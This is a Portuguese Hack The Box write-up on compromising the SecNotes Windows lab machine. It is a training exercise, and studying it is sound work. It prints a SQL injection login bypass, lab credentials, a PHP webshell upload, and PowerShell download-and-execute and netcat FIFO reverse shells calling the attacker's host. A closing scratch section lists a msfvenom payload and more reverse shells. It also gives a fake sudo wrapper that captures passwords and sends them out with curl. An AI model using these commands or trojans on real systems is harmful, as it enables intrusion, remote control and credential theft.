---
title:     "Hack The Box - SecNotes"
tags: [windows,medium, Abusing wsl, nishang]
categories: HackTheBox
---

![1337.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/1337.jpg)


## Enumeration

Usando o autorecon podemos agilizar o processo

```
# Nmap 7.80 scan initiated Tue Jul 14 12:52:55 2020 as: nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /root/HTB-Windows/secnotes/results/10.10.10.97/scans/_full_tcp_nmap.txt -oX /root/HTB-Windows/secnotes/results/10.10.10.97/scans/xml/_full_tcp_nmap.xml 10.10.10.97
Nmap scan report for 10.10.10.97
Host is up, received user-set (0.40s latency).
Scanned at 2020-07-14 12:52:59 EDT for 920s
Not shown: 65532 filtered ports
Reason: 65532 no-responses
PORT     STATE SERVICE      REASON          VERSION
80/tcp   open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
445/tcp  open  microsoft-ds syn-ack ttl 127 Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.80%E=4%D=7/14%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=5F0DE683%P=x86_64-pc-linux-gnu)
SEQ(SP=106%GCD=1%ISR=109%TI=RD%II=I%TS=U)
SEQ(SP=106%GCD=1%ISR=109%TI=RD%TS=U)
OPS(O1=M54DNW8NNS%O2=M54DNW8NNS%O3=M54DNW8%O4=M54DNW8NNS%O5=M54DNW8NNS%O6=M54DNNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M54DNW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Randomized
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h19m52s, deviation: 4h02m33s, median: -10s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 25086/tcp): CLEAN (Timeout)
|   Check 2 (port 9222/tcp): CLEAN (Timeout)
|   Check 3 (port 53444/udp): CLEAN (Timeout)
|   Check 4 (port 51444/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2020-07-14T10:07:36-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-07-14T17:07:30
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   366.33 ms 10.10.14.1
2   385.27 ms 10.10.10.97

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 14 13:08:19 2020 -- 1 IP address (1 host up) scanned in 925.90 seconds
```

Temos entao, 3 portas abertas `80 445 8808`

Navegando ate a porta 80 temos uma tela de login

![22.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/22.jpg)

na port 8808 temos um IIS 10 

![33.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/33.jpg)

Comeco entao pela porta 80, criei um user mas nada de interessante.. Entao resolvi tentar tecnicas de SQLI para bypass de auth

***reference***  https://github.com/payloadbox/sql-injection-payload-list

Usando a primeiro payload encontrado na aba `SQL Injection Auth Bypass Payloads` 

```
login: '-' password: 123456
```

Consigo acesso a informacoes com um nivel mais elevado e uma das notas encontro um login 

![2.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/2.jpg)

com essa cred tento entao acesso ao SMB usando crackmapexec 

```
\\secnotes.htb\new-site
tyler / 92g!mA8BGjOirkL%OG*&
```

`crackmapexec smb 10.10.10.97 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&' --shares`

![3.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/3.jpg)

Conseguimos mais algumas informacoes importantes como a versao do windows e um share com permissao de escrite e leitura

Em seguida monto entao esse share no meu kali

***reference*** https://book.hacktricks.xyz/pentesting/pentesting-smb

`mount -t cifs -o username=tyler,password='92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site /mnt/new-site`

![5.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/5.jpg)

Lembra? eu tenho permissao de escrita.. fiz um teste entao escrevendo um arquivo de texto simples e acessando ele na porta 8808 `http://10.10.10.97:8808/anakein.txt` tentei tbm escrever uma webshell bem conhecida Antak

![6.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/6.jpg)

Veja, a webshell nao carregava mais o arquivo de texto sim. 

![7.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/7.jpg)

 de imediato fiquei tentando fazer bypass e usar outras tecnicas mas sem sucesso
 
 ![9.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/9.jpg)

 depois de enviar uma webshell em `.php` tive sucesso
 
 aah. mas antes disso eu observei que o arquivo enviado depois de alguns minutos era apagado...
 
![8.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/8.jpg)
 
 continuandoo..
 
 depois de enviar uma webshell em PHP rapidamente tenho uma webshell ativa...
 
 ***reference*** https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/9377612eeea89aed2b226a870e76ac12965d6694/easy-simple-php-webshell.php
 
 https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985
 
![10.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/10.jpg)

tambem usei isso como referencia https://www.microsoft.com/security/blog/2020/02/04/ghost-in-the-shell-investigating-web-shell-attacks/  

 ## Reverse Shell
 
 com um dos melhores repo que eu conheco o nishang rapidamente tenho uma rev shell em powershell
 
 ***reference*** https://github.com/samratashok/nishang
 
 Primeiro ative o seu web server no repo do nishang, eu sempre uso o modulo do py para agilizar por ele ser simples
 
 `python -m SimplesHTTPServer 80`
 
 em seguida ativo o listener na port `53`
 
 `rlwrap nc -nlvp 53`
 
 e entao na nossa webshell eu executo
 
 ```
 powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.55/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.55 -Port 53
 ```
 
![11.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/11.jpg)

## Get User

![13.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/13.jpg)

## Privilege Escalation

Depois de usar diversas tools de enumeracao para privesc nao tinha sucesso nenhum... comcei entao a investigar o que tinha disponivel no Desktop de tyler, entao achei algo suspeito `bash.lnk`

![14.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/14.jpg)

executando o path direto eu tinha um bash e como sabemos isso trata-se do wsl `Windows Subsystem for Linux`

`C:\Windows\System32\bash.exe --version`

comecei entao a pesquisar termos como `Abusing wsl` e encontrei muito material, um deles que me ajudou bastante foi este PDF http://archive.hack.lu/2018/A_Cervoise-Backdoor_Bash_on_Windows.pdf

Depois de ler o pdf rapidamente tenho uma reverse shell de root 

`C:\Windows\System32\bash.exe -c "mknPS C:\inetpub\new-site>C:\Windows\System32\bash.exe -c "mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc 10.10.14.55 53 1>/tmp/backpipe"`

![15.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/15.jpg)

### Spawn Shell

`python -c 'import pty;pty.spawn("/bin/bash")'`

apois isso comeco a usar tbm os scripts de privesc para windows, mas sem resultados

comeco entao o traballho manual de pesquisa, port hash, password, login alguma coisa do tipo

entao, no dir do root encontro um bash_history com o login do Administrator

![16.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/16.jpg)

Com o login do administrator usando o `winexe` temos uma shell de ADMINISTRATOR

`winexe -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' //10.10.10.97 cmd.exe`

![17.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/17.jpg)


![18.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/18.jpg)


## Rascunho

```
smbclient //192.168.1.108/raj


\\10.10.10.97\new-site
tyler / 92g!mA8BGjOirkL%OG*&



crackmapexec smb 10.10.10.97 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&' --shares



smbmap -u "tyler" -p "92g!mA8BGjOirkL%OG*&" -R new-site -H 10.10.10.97 -P 445


mount -t cifs -o username=tyler,password='92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site /mnt/new-site



./psexec.py secnotes.htb/tyler:'92g!mA8BGjOirkL%OG*&'@10.10.10.97


 

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.55 LPORT=53 -f exe -o reverse.exe

copy \\10.10.14.55\tools\reverse.exe C:\windows\temp\reverse.exe



dir C:\temp\


dir C:\windows\temp


.\C:\windows\temp\reverse.exe


copy \\10.10.14.55\tools\reverse.exe C:\Users\tyler\AppData\Local\Temp\
C:\Users\tyler\AppData\Local\Temp\reverse.exe

SafetyKatz.exe


powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.55/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.55 -Port 53




powershell -c start -verb runas cmd '/c start /D "whoami" bash.exe



C:\Distros\Ubuntu\temp\shell.sh



rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.55 443 >/tmp/f



C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalStaterootfs\etc\shadow

mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc 10.10.14.55 443 1>/tmp/backpipe


echo "echo $sudopass>> .hidden/pass.txt" >> .hidden/sudo
echo "curl http://10.10.14.55:81/?$sudopass" >> .hidden/sudo



mkdir .hidden
echo "export PATH=\$HOME/.hidden/:\$PATH:" >> .bashrc
echo "read -sp\"[sudo] password for $USER: \" sudopass" > .hidden/sudo
echo "echo \"\"" >> .hidden/sudo
echo "sleep 2" >> .hidden/sudo
echo "echo \"Sorry, try again.\"" >> .hidden/sudo
echo "echo $sudopass>> .hidden/pass.txt" >> .hidden/sudo
echo "/usr/bin/sudo\$1" >> .hidden/sudo
chmod+x .hidden/sudo


echo "echo $sudopass >> .hidden/pass.txt" >> .hidden/sudo
echo "curl http://10.10.14.55:81/?$sudopass" >> .hidden/sudo




echo "./.call-me.sh" >> .bashrc
echo "icacls.exe \"\\\\\\\\10.10.14.55\\\\tools\\\\\" > /dev/null 2>&1" >> .call-me.sh
chmod u+x .call-me.sh




C:\Windows\System32\bash.exe -c "mknod /tmp/backpipe4 p && /bin/sh 0</tmp/backpipe4 | nc 10.10.14.55 53 1>/tmp/backpipe4"



smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c


winexe -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' //10.10.10.97 cmd.exe
```
